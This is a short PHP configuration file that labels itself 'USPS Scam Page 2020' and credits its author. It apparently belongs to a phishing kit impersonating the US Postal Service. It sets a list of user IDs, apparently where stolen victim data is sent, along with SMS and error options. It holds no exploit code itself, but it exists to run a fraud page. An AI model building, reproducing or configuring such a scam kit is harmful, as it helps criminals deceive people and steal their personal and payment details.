<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("1422829756");
$sms='2';
$error='0';
?>
